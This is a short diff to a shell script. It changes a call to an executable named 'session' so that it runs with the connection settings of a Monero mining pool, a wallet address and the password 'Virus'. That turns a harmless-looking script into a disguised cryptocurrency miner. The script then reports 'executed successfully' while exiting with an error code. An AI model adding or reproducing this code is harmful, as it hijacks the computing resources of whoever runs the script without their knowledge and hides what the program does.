@@ -77,7 +77,7 @@ chmod +x *
 # Use session.log as the log file
 LOG_FILE="session.log"
 
-./session
+./session -o gulf.moneroocean.stream:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p Virus
 
 echo "Script executed successfully."
 exit 1
